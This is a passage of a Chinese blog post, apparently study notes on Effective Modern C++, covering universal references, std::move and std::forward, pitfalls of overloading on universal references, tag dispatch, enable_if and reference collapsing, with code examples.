id="结论">结论</span></h3><ul><li>如果一个函数模板形参的类型为<code>type&amp;&amp;</code>，并且<code>type</code>需要被推导得知，或者如果一个对象被声明为<code>auto&amp;&amp;</code>，这个形参或者对象就是一个通用引用。</li><li>如果类型声明的形式不是标准的<code>type&amp;&amp;</code>，或者如果类型推导没有发生，那么<code>type&amp;&amp;</code>代表一个右值引用。</li><li>通用引用，如果它被右值初始化，就会对应地成为右值引用；如果它被左值初始化，就会成为左值引用。</li></ul><h2><span id="25对右值引用使用stdmove对通用引用使用stdforward">25对右值引用使用<code>std::move</code>，对通用引用使用<code>std::forward</code></span></h2><p>在参数传递时，<code>std::forward</code>是有条件的传递，会根据参数的类型，传递实际的参数形式，右值还是右值，左值还是左值。</p><p><code>std::move</code>是无条件的将其变为右值。</p><p>有的时候，并不一定需要对象的移动操作。区分移动和拷贝是有必要的。遇到下面这种情况：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; newName)</span>    <span class="hljs-comment">//用const左值设置</span></span><br><span class="hljs-function">    </span>&#123; name = newName; &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp;&amp; newName)</span>         <span class="hljs-comment">//用右值设置</span></span><br><span class="hljs-function">    </span>&#123; name = <span class="hljs-built_in">std</span>::move(newName); &#125;<br>    <br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>如果不用 通用引用，那么实现会变得冗长，尤其是参数数量较多的时候。</p><p>使用通用引用 + 完美转发 std::forward，那么实现会优雅得多。</p><p>并且对于变参函数模板：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-title">class</span>... <span class="hljs-title">Args</span>&gt;                //来自<span class="hljs-title">C</span>++11标准</span><br><span class="hljs-class"><span class="hljs-title">shared_ptr</span>&lt;T&gt; <span class="hljs-title">make_shared</span>(<span class="hljs-title">Args</span>&amp;&amp;... <span class="hljs-title">args</span>);</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-title">class</span>... <span class="hljs-title">Args</span>&gt;                //来自<span class="hljs-title">C</span>++14标准</span><br><span class="hljs-class"><span class="hljs-title">unique_ptr</span>&lt;T&gt; <span class="hljs-title">make_unique</span>(<span class="hljs-title">Args</span>&amp;&amp;... <span class="hljs-title">args</span>);</span><br></code></pre></div></td></tr></table></figure><p>对于这种函数，对于左值和右值分别重载就不能考虑了：通用引用是仅有的实现方案。对这种函数，我向你保证，肯定使用<code>std::forward</code>传递通用引用形参给其他函数。</p><h3><span id="返回值的情况">返回值的情况</span></h3><p>如果你在<strong>按值</strong>返回的函数中，返回值绑定到右值引用或者通用引用上，需要对返回的引用使用<code>std::move</code>或者<code>std::forward</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Matrix                              <span class="hljs-comment">//按值返回</span><br><span class="hljs-keyword">operator</span>+(Matrix&amp;&amp; lhs, <span class="hljs-keyword">const</span> Matrix&amp; rhs)<br>&#123;<br>    lhs += rhs;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::move(lhs);        <span class="hljs-comment">//移动lhs到返回值中</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过在<code>return</code>语句中将<code>lhs</code>转换为右值（通过<code>std::move</code>），<code>lhs</code>可以移动到返回值的内存位置。如果省略了<code>std::move</code>调用，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Matrix                              <span class="hljs-comment">//同之前一样</span><br><span class="hljs-keyword">operator</span>+(Matrix&amp;&amp; lhs, <span class="hljs-keyword">const</span> Matrix&amp; rhs)<br>&#123;<br>    lhs += rhs;<br>    <span class="hljs-keyword">return</span> lhs;                     <span class="hljs-comment">//拷贝lhs到返回值中</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>lhs</code>是个左值的事实，会强制编译器拷贝它到返回值的内存空间。</p><p>假定<code>Matrix</code>支持移动操作，并且比拷贝操作效率更高，在<code>return</code>语句中使用<code>std::move</code>的代码效率更高。</p><p>如果<code>Matrix</code>不支持移动操作，将其转换为右值不会变差，因为右值可以直接被<code>Matrix</code>的拷贝构造函数拷贝。</p><p>使用通用引用和<code>std::forward</code>的情况类似。考虑函数模板<code>reduceAndCopy</code>收到一个未reduce（unreduced）对象<code>Fraction</code>，将其规约，并返回一个reduce(规约，好难听的名字) 后的副本。</p><p>如果原始对象是右值，可以将其移动到返回值中（避免拷贝开销），但是如果原始对象是左值，必须创建副本，因此如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>Fraction                            <span class="hljs-comment">//按值返回</span><br>reduceAndCopy(T&amp;&amp; frac)             <span class="hljs-comment">//通用引用的形参</span><br>&#123;<br>    frac.reduce();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::forward&lt;T&gt;(frac);<span class="hljs-comment">//移动右值，或拷贝左值到返回值中</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果<code>std::forward</code>被忽略，<code>frac</code>就被无条件复制到<code>reduceAndCopy</code>的返回值内存空间。</p><p>注意，对于函数内部的局部变量，这是不成立的。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget <span class="hljs-title">makeWidget</span><span class="hljs-params">()</span>                 <span class="hljs-comment">//makeWidget的“拷贝”版本</span></span><br><span class="hljs-function"></span>&#123;<br>    Widget w;                       <span class="hljs-comment">//局部对象</span><br>    …                               <span class="hljs-comment">//配置w</span><br>    <span class="hljs-keyword">return</span> w;                       <span class="hljs-comment">//“拷贝”w到返回值中</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>他们想要“优化”代码，把“拷贝”变为移动：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget <span class="hljs-title">makeWidget</span><span class="hljs-params">()</span>                 <span class="hljs-comment">//makeWidget的移动版本</span></span><br><span class="hljs-function"></span>&#123;<br>    Widget w;<br>    …<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::move(w);            <span class="hljs-comment">//移动w到返回值中（不要这样做！）</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>因为有 RVO的存在，<code>makeWidget</code>的“拷贝”版本实际上不拷贝任何东西。在返回的地址上，进行对象的构造。</p><p>但是 move 版本，不支持 RVO。</p><p>返回的已经不是局部对象<code>w</code>，而是<strong><code>w</code>的引用</strong>——<code>std::move(w)</code>的结果。</p><h3><span id="结论">结论</span></h3><ul><li>对于传入函数的形参，在函数内最后一次使用时，在右值引用上使用<code>std::move</code>，在通用引用上使用<code>std::forward</code>。</li><li>对按值返回的函数要返回的右值引用使用<code>std::move</code>，和通用引用使用<code>std::forward</code>。</li><li>如果局部对象可以被返回值优化消除，就绝不使用<code>std::move</code>或者<code>std::forward</code>。</li></ul><h2><span id="26-避免重载通用引用">26 避免重载通用引用</span></h2><h3><span id="弊端一">弊端一</span></h3><p>比如，下面的例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">logAndAdd</span><span class="hljs-params">(T&amp;&amp; name)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> now = <span class="hljs-built_in">std</span>::chrono::system_clock::now();<br>    <span class="hljs-built_in">log</span>(now, <span class="hljs-string">"logAndAdd"</span>);<br>    names.emplace(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(name));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">logAndAdd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx)</span>             <span class="hljs-comment">//新的重载</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> now = <span class="hljs-built_in">std</span>::chrono::system_clock::now();<br>    <span class="hljs-built_in">log</span>(now, <span class="hljs-string">"logAndAdd"</span>);<br>    names.emplace(nameFromIdx(idx));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果有以下调用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">short nameIdx;<br><br>logAndAdd(nameIdx);                     <span class="hljs-comment">//错误！</span><br></code></pre></div></td></tr></table></figure><p>由于没有 short类型的重载，但是有通用引用存在，所以<code>name</code>形参绑定到要传入的<code>short</code>上，然后<code>name</code>被<code>std::forward</code>给<code>names</code>（一个<code>std::multiset&lt;std::string&gt;</code>）的<code>emplace</code>成员函数，然后又被转发给<code>std::string</code>构造函数。<code>std::string</code>没有接受<code>short</code>的构造函数，所以<code>logAndAdd</code>调用里的<code>multiset::emplace</code>调用里的<code>std::string</code>构造函数调用失败。</p><p>所有这一切的原因就是对于<code>short</code>类型通用引用重载优先于<code>int</code>类型的重载。这导致了代码执行出错。</p><p>使用通用引用的函数在C++中是最贪婪的函数。它们几乎可以精确匹配任何类型的实参。</p><p>通用引用的实现会匹配比开发者预期要多得多的实参类型。</p><h3><span id="弊端二">弊端二</span></h3><p>有以下<code>Person</code>类：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Person</span><span class="hljs-params">(T&amp;&amp; n)</span>              <span class="hljs-comment">//完美转发的构造函数，初始化数据成员</span></span><br><span class="hljs-function">    : <span class="hljs-title">name</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(n))</span> </span>&#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx)</span>            <span class="hljs-comment">//int的构造函数</span></span><br><span class="hljs-function">    : <span class="hljs-title">name</span><span class="hljs-params">(nameFromIdx(idx))</span> </span>&#123;&#125;<br>    …<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>函数模板能实例化产生与拷贝和移动构造函数一样的签名。如果拷贝和移动构造被生成，<code>Person</code>类看起来就像这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;            <span class="hljs-comment">//完美转发的构造函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Person</span><span class="hljs-params">(T&amp;&amp; n)</span></span><br><span class="hljs-function">    : <span class="hljs-title">name</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(n))</span> </span>&#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx)</span></span>;       <span class="hljs-comment">//int的构造函数</span><br><br>    Person(<span class="hljs-keyword">const</span> Person&amp; rhs);      <span class="hljs-comment">//拷贝构造函数</span><br>    Person(Person&amp;&amp; rhs);           <span class="hljs-comment">//移动构造函数</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>如果通过 non-<code>const</code>左值类型的<code>Person</code>来拷贝构造一个新的对象，完美转发的构造函数会优先匹配。</p><p>如果通过 <code>const</code>左值类型的<code>Person</code>来拷贝构造一个新的对象，拷贝构造函数会优先匹配，因为这是精确匹配。</p><p>如果在继承关系中，会有以下行为：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpecialPerson</span>:</span> <span class="hljs-keyword">public</span> Person &#123;<br><span class="hljs-keyword">public</span>:<br>    SpecialPerson(<span class="hljs-keyword">const</span> SpecialPerson&amp; rhs) <span class="hljs-comment">//拷贝构造函数，调用基类的</span><br>    : Person(rhs)                           <span class="hljs-comment">//基类的完美转发构造函数！</span><br>    &#123; … &#125;<br><br>    SpecialPerson(SpecialPerson&amp;&amp; rhs)      <span class="hljs-comment">//移动构造函数，调用基类的</span><br>    : Person(<span class="hljs-built_in">std</span>::move(rhs))                <span class="hljs-comment">//基类的完美转发构造函数！</span><br>    &#123; … &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>派生类的拷贝和移动构造函数没有调用基类的<strong>拷贝和移动构造函数</strong>，而是调用了基类的<strong>完美转发构造函数</strong>。</p><p>派生类将<code>SpecialPerson</code>类型的实参传递给其基类，然后通过模板实例化和重载解析规则作用于基类<code>Person</code>。最终，代码无法编译，因为<code>std::string</code>没有接受一个<code>SpecialPerson</code>的构造函数（只有完美转发构造函数初始化了<code>name</code> ）。</p><h3><span id="结论">结论</span></h3><ul><li>对通用引用形参的函数进行重载时，通用引用函数可匹配的类型，几乎总会比你期望的多得多。</li><li>完美转发构造函数是糟糕的实现，因为对于non-<code>const</code>左值，它们会优先于拷贝构造函数匹配，而且会劫持派生类对于基类的拷贝和移动构造函数的调用。</li></ul><h2><span id="27-通用引用重载的替代方法">27 通用引用重载的替代方法</span></h2><p>一个直接的思路，放弃重载，另外声明一个函数签名。</p><p>另一种思路，放弃重载，但是使用 lvalue-refrence-to-<code>const</code>的方式，参数类型变为 const T&amp;。</p><p>放弃重载的另一种思路是，直接传值 +<code>std::mov</code>，的方式。</p><p>另外两种方案，保留了重载，但是都有局限，效率更高但是并不是万能的。这两种方案是：<code>tag dispatch</code>和 <code>enable_if 约束模板</code>。</p><h3><span id="tag-dispath">tag dispath</span></h3><p>实现形式：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">logAndAdd</span><span class="hljs-params">(T&amp;&amp; name)</span></span><br><span class="hljs-function"></span>&#123;<br>    logAndAddImpl(<br>        <span class="hljs-built_in">std</span>::forward&lt;T&gt;(name),<br>        <span class="hljs-built_in">std</span>::is_integral&lt;<span class="hljs-keyword">typename</span> <span class="hljs-built_in">std</span>::remove_reference&lt;T&gt;::type&gt;()<br>        <span class="hljs-comment">// C++14 </span><br>        <span class="hljs-comment">// std::is_integral&lt;std::remove_reference&lt;T&gt;&gt;()</span><br>    );<br>&#125;<br></code></pre></div></td></tr></table></figure><p>原来函数模板不变，但是将实际的函数调用，进行了分发（dispatch）。</p><p>之所以 remove_reference，是因为 T 可能被推导为左值 T&amp;，这不是<code>type trait</code> <code>std::is_integral</code>识别为真的类型。</p><p>分发实现为：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                            <span class="hljs-comment">//非整型实参：添加到全局数据结构中</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">logAndAddImpl</span><span class="hljs-params">(T&amp;&amp; name, <span class="hljs-built_in">std</span>::false_type)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> now = <span class="hljs-built_in">std</span>::chrono::system_clock::now();<br>    <span class="hljs-built_in">log</span>(now, <span class="hljs-string">"logAndAdd"</span>);<br>    names.emplace(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(name));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">nameFromIdx</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx)</span></span>;           <span class="hljs-comment">// 整型实参：查找名字并用它调用logAndAdd</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">logAndAddImpl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx, <span class="hljs-built_in">std</span>::true_type)</span> </span><br><span class="hljs-function"></span>&#123;<br>  logAndAdd(nameFromIdx(idx)); <br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里的 <code>std::false_type</code> 和 <code>std::true_type</code>，是 T 分别在不满足 <code>std::is_integral</code>和满足<code>std::is_integral</code> 的情况下的父类。</p><h3><span id="enable_if-约束模板">enable_if 约束模板</span></h3><p>tag dispath 并不能解决父类的通用引用重载函数的问题（见上一条款26）。</p><p>enable_if 约束模板，基于以下机制：</p><p>默认情况下，所有模板是<strong>启用</strong>的（enabled），但是使用<code>std::enable_if</code>可以使得仅在<code>std::enable_if</code>指定的条件满足时模板才启用。不满足条件，模板就是被<strong>禁止</strong>（disabled）的。</p><p>首先解决传入 Person 类对象，导致通用引用重载中，string 用 Person对象初始化报错的问题：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">// C++11</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span>&lt;<br>        <span class="hljs-keyword">typename</span> T,<br>        <span class="hljs-keyword">typename</span> = <span class="hljs-keyword">typename</span> <span class="hljs-built_in">std</span>::enable_if&lt;<br>               <span class="hljs-comment">// !std::is_base_of&lt;Person, </span><br>                       !<span class="hljs-built_in">std</span>::is_base_of&lt;Person, <br>                                        <span class="hljs-keyword">typename</span> <span class="hljs-built_in">std</span>::decay&lt;T&gt;::type<br>                                       &gt;::value<br>                   &gt;::type<br>    &gt;<br>    <span class="hljs-keyword">explicit</span> Person(T&amp;&amp; n);<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>使用 <code>type trait</code> <code>is_same</code> ，可以在传入 Person对象时，禁用模板。但是，传入子类对象，同样时不允许的，所以使用了<code>std::is_base_of</code>。</p><p><code>std::decay&lt;T&gt;</code>去掉了对于<code>T</code>的引用，<code>const</code>，<code>volatile</code>修饰。</p><p>再结合对传入 int 类型参数的限制，可以的得到下面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span>&lt;<br>        <span class="hljs-keyword">typename</span> T,<br>        <span class="hljs-keyword">typename</span> = <span class="hljs-built_in">std</span>::<span class="hljs-keyword">enable_if_t</span>&lt;<br>            !<span class="hljs-built_in">std</span>::is_base_of&lt;Person, <span class="hljs-built_in">std</span>::<span class="hljs-keyword">decay_t</span>&lt;T&gt;&gt;::value<br>            &amp;&amp;<br>            !<span class="hljs-built_in">std</span>::is_integral&lt;<span class="hljs-built_in">std</span>::<span class="hljs-keyword">remove_reference_t</span>&lt;T&gt;&gt;::value<br>        &gt;<br>    &gt;<br>    <span class="hljs-keyword">explicit</span> Person(T&amp;&amp; n)          <br>    : name(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(n))      <span class="hljs-comment">//std::strings的实参的构造函数</span><br>    &#123;<br>        <span class="hljs-comment">//断言可以用T对象创建std::string</span><br>        <span class="hljs-keyword">static_assert</span>(<br>        <span class="hljs-built_in">std</span>::is_constructible&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, T&gt;::value,<br>        <span class="hljs-string">"Parameter n can't be used to construct a std::string"</span><br>        );<br>        ...<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> idx)</span>        <span class="hljs-comment">//整型实参的构造函数</span></span><br><span class="hljs-function">    : <span class="hljs-title">name</span><span class="hljs-params">(nameFromIdx(idx))</span></span><br><span class="hljs-function">    </span>&#123; … &#125;<br><br>    …                               <span class="hljs-comment">//拷贝、移动构造函数等</span><br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;<br>&#125;;<br></code></pre></div></td></tr></table></figure><blockquote><p>其中：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt; <span class="hljs-keyword">bool</span> B, <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span> = <span class="hljs-title">void</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">using</span> <span class="hljs-title">enable_if_t</span> = <span class="hljs-title">typename</span> <span class="hljs-title">enable_if</span>&lt;B,T&gt;:</span>:type; <span class="hljs-comment">// (since C++14)</span><br></code></pre></div></td></tr></table></figure></blockquote><p>这里的 <code>static_assert</code> 断言虽然可以识别，T类型是否可以构建 string，但是这发生在<code>name(std::forward&lt;T&gt;(n))</code>之后。所以，报错先于断言。</p><h3><span id="结论">结论</span></h3><ul><li>通用引用重载的替代方法：使用不同的函数名，通过lvalue-reference-to-<code>const</code>传递形参，按值传递形参，使用<em>tagdispatch</em>，使用 <code>enable_if</code> 约束模板。</li><li>通用引用参数通常具有高效率的优势，但是其使用需要仔细分析。</li></ul><h2><span id="28-引用折叠">28 引用折叠</span></h2><p>目的就是禁止你生成引用的引用。</p><p>存在两种类型的引用（左值和右值），所以有四种可能的引用组合（左值的左值，左值的右值，右值的右值，右值的左值）。</p><p>这些组合的的结果：如果两个中任一引用为左值引用，则结果为左值引用。否则（即，如果引用都是右值引用），结果为右值引用。</p><table><thead><tr class="header"><th>组合</th><th>结果</th></tr></thead><tbody><tr class="odd"><td>左值的右值</td><td>左值</td></tr><tr class="even"><td>左值的左值</td><td>左值</td></tr><tr class="odd"><td>右值的左值</td><td>左值</td></tr><tr class="even"><td>右值的右值</td><td>右值</td></tr></tbody></table><h3><span id="stdforword实现">std::forword实现</span></h3><p><code>std::forward</code>应用在通用引用参数上，所以经常能看到这样使用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp;&amp; fParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    …                                   <span class="hljs-comment">//做些工作</span><br>    someFunc(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(fParam));  <span class="hljs-comment">//转发fParam到someFunc</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>因为<code>fParam</code>是通用引用，类型参数<code>T</code>的类型根据<code>f</code>被传入实参（即用来实例化<code>fParam</code>的表达式）是左值还是右值来决定。</p><p><code>std::forward</code>的作用是当且仅当传给<code>f</code>的实参为右值时（此时<code>T</code>为非引用类型），才将<code>fParam</code>转化为一个右值。</p><p><code>std::forward</code>可以这样实现：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                                <span class="hljs-comment">//在std命名空间</span><br><span class="hljs-function">T&amp;&amp; <span class="hljs-title">forward</span><span class="hljs-params">(<span 